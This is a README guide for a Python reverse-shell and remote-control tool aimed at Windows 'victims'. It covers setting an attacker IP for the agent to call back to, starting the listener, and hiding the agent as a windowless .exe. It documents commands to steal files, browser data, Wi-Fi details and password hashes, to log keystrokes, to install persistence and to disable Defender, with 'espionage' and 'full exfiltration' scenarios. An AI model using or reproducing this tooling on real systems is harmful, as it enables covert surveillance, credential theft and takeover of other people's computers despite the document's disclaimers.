# 🔥 RevShell v2.0 — Complete Guide

```
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║ ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗  ║
║ ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║  ║
║ ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║  ║
║ ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║  ║
║ ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗██║  ║
║ ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ║
║                                                       ║
║           Advanced Reverse Shell v2.0                 ║
║                                                       ║
╚═══════════════════════════════════════════════════════╝
```

> ⚠️ **DISCLAIMER**
> This project is **ONLY for educational purposes** and **authorized penetration testing**. Unauthorized use is illegal.

---

## 📑 Table of Contents

1. [What is this?](#-what-is-this)
2. [Requirements](#-requirements)
3. [Initial Setup](#-initial-setup-step-by-step)
4. [How to Run](#-how-to-run)
5. [Complete Command Guide](#-complete-command-guide)
6. [Usage Scenarios](#-usage-scenarios-practical-examples)
7. [Technical Architecture](#-technical-architecture-for-experts)
8. [Communication Protocol](#-communication-protocol)
9. [Security & Encryption](#-security--encryption)
10. [Persistence in Detail](#-persistence-in-detail)
11. [Troubleshooting](#-troubleshooting)
12. [Compile to .exe](#-compile-to-exe-pyinstaller)
13. [Changelog v2.0](#-changelog-v20)

---

## 🤔 What is this?

### Beginner Explanation

RevShell v2.0 is a **reverse shell**:

```
┌─────────────┐        ┌──────────────┐
│ ATTACKER    │        │ VICTIM       │
│ (listener)  │        │ (client)     │
│             │        │              │
│ Listens     │ <───── │ Connects     │
│ on port     │        │              │
│             │ ─────> │ Executes cmd │
│ Receives    │ <───── │ Sends result │
│ results     │        │              │
└─────────────┘        └──────────────┘
```

Unlike a normal shell, the **victim connects to you**, bypassing inbound firewall restrictions.

---

### Technical Explanation

A lightweight Python C2 framework with:

* XOR-encrypted TCP communication
* Base64 chunked file transfer
* Post-exploitation modules (enumeration, exfiltration, persistence, keylogging)

---

### Project Files

| File            | Description       | Runs on        |
| --------------- | ----------------- | -------------- |
| `listener.py`   | Control interface | Attacker       |
| `victim_win.py` | Agent             | Windows victim |

---

## 📋 Requirements

### Attacker

* Python 3.6+
* Any OS
* No dependencies

### Victim

* Windows 7–11
* Python or compiled `.exe`
* No external libraries

### Network

* Open port (default `4444`)
* LAN or port forwarding / VPS

---

## ⚙️ Initial Setup (Step by Step)

### Step 1: Get Attacker IP

```bash
# Windows
ipconfig

# Linux
ip a
```

Use:

* Local → `192.168.x.x`
* Same machine → `127.0.0.1`
* Internet → public IP / domain

---

### Step 2: Configure `victim_win.py`

```python
ATTACKER_IP = "192.168.1.100"
ATTACKER_PORT = 4444
XOR_KEY = 0x42
RECONNECT_DELAY = 5
```

---

### Step 3: Configure `listener.py`

```python
LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 4444
XOR_KEY = 0x42
```

> ⚠️ XOR_KEY and PORT must match on both sides.

---

### Step 4: Firewall

**Windows:**

```powershell
netsh advfirewall firewall add rule name="RevShell" dir=in action=allow protocol=TCP localport=4444
```

**Linux:**

```bash
sudo ufw allow 4444/tcp
```

---

## 🚀 How to Run

### 1. Start Listener

```bash
python listener.py
```

```
[*] Listening on 0.0.0.0:4444...
```

---

### 2. Run Victim

```bash
python victim_win.py
```

or:

```bash
victim_win.exe
```

---

### 3. Connection

```
[+] Connection received from 192.168.1.50:54321
[+] Connected: user@PC-VICTIM in C:\Users\user
shell>
```

---

## 📖 Complete Command Guide

### 🗺️ Navigation

| Command | Description            |
| ------- | ---------------------- |
| cd      | Change directory       |
| pwd     | Show current directory |
| ls      | List files             |

Example:

```
Directory: C:\Users\victim\Desktop

[DIR]  Projects
[FILE] notes.txt
```

---

### 📁 File Transfer

| Command  | Description |
| -------- | ----------- |
| download | Get file    |
| upload   | Send file   |

---

### 🎯 Data Collection

* `steal` → user files
* `sysinfo` → system data
* `screenshot` → screen capture
* `browsers` → browser data
* `exfil` → everything

---

### 📊 Info Commands

* `status`
* `wifi`
* `clipboard`
* `software`
* `privesc`

---

### 🔒 Persistence

| Command        | Description |
| -------------- | ----------- |
| persist        | Install all |
| persist check  | Verify      |
| persist remove | Clean       |

---

### ⌨️ Keylogger

| Command      | Description |
| ------------ | ----------- |
| keylog start | Start       |
| keylog dump  | View        |
| keylog stop  | Stop        |

---

### 🛡️ Admin Commands

* `disable_defender`
* `dump_hashes`

---

### 🧰 Utilities

| Command | Description       |
| ------- | ----------------- |
| alert   | Popup             |
| cleanup | Remove temp files |
| ps      | Run PowerShell    |
| exit    | Disconnect        |
| kill    | Terminate         |

---

### 🏠 Local Commands

```
!ls
!pwd
!clear
```

---

## 🎮 Usage Scenarios

### Recon

```
status
sysinfo
wifi
```

---

### Full Exfiltration

```
exfil
```

---

### Espionage

```
keylog start
screenshot
keylog dump
```

---

### Persistence

```
persist
persist check
```

---

## 🧠 Technical Architecture

* Client-server model
* Persistent TCP connection
* Command dispatcher
* Modular post-exploitation

---

## 🔐 Communication Protocol

* XOR encryption
* Length-prefixed messages
* Base64 chunked transfer

---

## 🔐 Security Notes

* No authentication
* Weak encryption
* Detectable persistence
* Visible process

---

## 🛠️ Troubleshooting

| Issue         | Fix           |
| ------------- | ------------- |
| No connection | Check IP/port |
| No output     | Try cmd /c    |
| Errors        | Match XOR_KEY |

---

## ⚙️ Compile to EXE

```bash
pyinstaller --onefile --noconsole victim_win.py
```

---

## 🆕 Changelog v2.0

* Added keylogger
* Added exfil command
* Improved persistence
* Added browser extraction
* Enhanced command set

---

## ⚖️ Legal

Use only with permission.

---

## 🧠 Reality Check

If you deploy this without authorization, it's not “pentesting”. It's just illegal.
